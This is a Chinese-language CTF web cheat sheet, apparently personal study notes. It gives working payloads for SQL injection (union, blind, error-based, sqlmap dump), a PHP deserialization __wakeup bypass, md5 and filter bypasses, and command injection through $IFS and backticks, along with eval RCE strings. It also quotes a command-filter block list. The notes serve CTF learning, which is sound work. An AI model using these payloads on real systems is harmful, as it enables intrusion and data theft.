# CTF WEB

## SQL注入

1. 先找到是数字型注入还是字符型注入 并判断闭合符

​	id = 1 的回显是否和 id = 2-1 一样 -> 判断是何种注入

​	?id=1' and 1=2--+ -> 判断‘是否为闭合符

​	简单粗暴一点：就是直接看回显有没有报错

​	找到之后还可以试试万能钥匙（以单引号为闭合符为例）

​	?id = a' or true#

2. 找到回显位

​	?id=-1' union select 1,2,3--+ -> 判断哪一位为回显位

3. 开始利用范式找到表名（例如第2位为回显位）（结果为fl4g）

​	union select 1,database(),group_concat(**table_name**)from information_schema.tables where table_schema=**database()**--+

```
union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()--+
```



4. 再利用范式从表名中找到列名    （结果为fllllag）

   union select 1,database(),group_concat(**column_name**)from information_schema.columns where table_name=**'fl4g'**--+

   ```
   union select 1,database(),group_concat(column_name)from information_schema.columns where table_name='fl4g'--+
   ```

   

5. 最后利用select从列名中找到flag

   union select 1,database(),group_concat(fllllag)from fl4g--+

6. 跳过过滤：

   空格：转换为/**/

   union：双写为ununionion
   
   #### sqlite注入
   
   [sqlite注入的一点总结 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/8627?u_atoken=100bccca0fa7b41dc93d4d361afe51c9&u_asig=1a0c39a017268046181531556e0035)

#### 布尔盲注

没有回显位时可用此方法注入 需用python脚本自动化此方法 但是待学习python脚本编程

1. 先找到数据库名的长度

   ```sql
   ?id=1 and length(database())=1
   #query_error
   ...
   ?id=1 and length(database())=4
   #query_success
   #库名长度为4
   
   ```

   

2. 在利用substr函数挨个找到database()的名字

   ```sql
   ?id=1 and substr(database(),1,1)=‘a’
   #query_error
   ...
   ?id=1 and substr(database(),1,1)=‘s’
   #query_success
   #库名第一个字符是s
   ...
   ?id=1 and substr(database(),4,1)=‘i’
   #query_success
   #库名第四个字符是i
   #库名是sqli
   
   ```

3. 此后便根据此找到database 的 表个数 表名 列个数 列名 内容 即可

   **人工巨麻烦，必须找到利用python脚本的方法**

#### 报错注入

当网站开启错误调试信息时可用此方法注入（不然只能盲注）

假设一个网站传入为name = xxxx, pass = xxxx

1. 利用范式找到database中的所有表名（此处pass被注释）

   name=1'and updatexml(1,concat(0x7e,(**SELECT group_concat(table_name) from information_schema.tables where table_schema=database()))**,1)--+&pass=xxxxx --+

   熟悉吗？接下来加粗部分同SQL注入即可

#### sqlmap

python sqlmap.py -u "http://node4.anna.nssctf.cn:28366/?id=1" --dump

## 反序列化

如何跳过__wakeup函数？

O:6:"HaHaHa":***3***:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}

如上所示 对象本该只有两个属性 admin 和 passwd ，将数量设置为3即可在反序列化中跳过wakeup函数。

例题：

```php
<?php
error_reporting(0);
class dxg
{
   function fmm()
   {
      return "nonono";
   }
}

class lt
{
   public $impo='hi';
   public $md51='weclome';
   public $md52='to NSS';
    
   function __construct()
   {
      $this->impo = new dxg;
   }
   function __wakeup()
   {
       # 此处污染impo属性 需要跳过wakeup
      $this->impo = new dxg;
      return $this->impo->fmm();
   }

   function __toString()
   {
      if (isset($this->impo) && md5($this->md51) == md5($this->md52) && $this->md51 != $this->md52)
          # 此处可以调用impo属性的fmm方法 只用是impo属性为fin对象即可
         return $this->impo->fmm();
   }
   function __destruct()
   {
      echo $this;
   }
}

class fin
{
   public $a;
   public $url = 'https://www.ctfer.vip';
   public $title;
   function fmm()
   {
      $b = $this->a;
      $b($this->title);
   }
}

if (isset($_GET['NSS'])) {
   $Data = unserialize($_GET['NSS']);
} else {
   highlight_file(__file__);
}
```

思路：

先找到能找到能回显flag的点位

此处点位在调用fin类中的fmm方法，只需将$b="system" title="cat /flag" 即可

如何调用fin类中的fmm方法呢？再往上看 可知在lt类中的__toSrting函数会调用fmm方法

我们需要构造一个lt类并将其反序列化即可。







## PHP伪协议

如何回显文件？

system(cat /flag)

#### 文件包含

posh不要随便加空格

如何绕过waf？

先利用伪协议查看index.php的编码

找到条件并跳过即可

## 绕过

#### md5数组绕过

```
if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){
    echo $FLAG;
} 
```

此时传入两个数组即可，因为数组可以被传入md5，但是会返回NULL。

#### md5弱比较绕过

```php
$first==md5($first)
```

$first=0e215962017

#### 双写绕过

```
$str = preg_replace('/NSSCTF/',"",$_GET['str']);
```

这里屏蔽了NSSCTF 只要我们这样写： NSSNSSCTFCTF 中间的NSSCTF就会被替换，留存下来的字符仍然是NSSCTF。

#### 通配符绕过

```php
if(!preg_match("/\;|\&|\\$|\x09|\x26|more|less|head|sort|tail|sed|cut|awk|strings|od|php|ping|flag/i", $cmd)){
        return($cmd);
    } 

shell_exec($cmd); 
```

此时可以用通配符将flag写入fuck.txt 再直接从url中读取fuck.txt即可

传参：?cmd=cat /f* > fuck.txt、

#### session绕过

[CTF-Web20（涉及简单的cookie与session）_ctf session-CSDN博客](https://blog.csdn.net/weixin_39934520/article/details/108716916)



#### 常见Linux命令绕过

ls绕过(内联执行)

ip=;cat$IFS$9`ls`

 linux下，会先执行反引号下面的语句
 在这里会执行ls,ls的结果是“index.php flag.php”
 所以最后执行的语句等价于
 cat index.php flag.php



## XXF

从本地页面跳转使用

X-Forwarded-For: 127.0.0.1

Referer:127.0.0.1

遇到将字符作为语句执行 可以将该字符设置为system("cat /f*")

### RCE(远程代码执行漏洞)

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['url']))
{
eval($_GET['url']);
}
?> 
```

传入url=system("ls");

找到flag后再传入url=system("cat /f*");即可



还可以使用反引号绕过

##### 反引号绕过

ip=;cat$IFS$9`ls`
 原理讲解：
 linux下，会先执行反引号下面的语句
 在这里会执行ls,ls的结果是“index.php flag.php”
 所以最后执行的语句等价于
 cat index.php flag.php
 右键查看页面源码即可得到flag

$IFS$9可用来代替空格

```
代替空格
< 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等
```

### PUT 请求

put请求需要利用burp抓包再修改

#### 今天天气真好

没有过滤“\”，在shell中反斜杠被当作转义符号处理，对一个字母的转义任然是他本身，故诸如“l\s”会被当作“ls”处理，从而实现绕过；

在php中，被反单引号包裹的字符会被作为shell命令处理，之后利用print函数即可获得输出结果
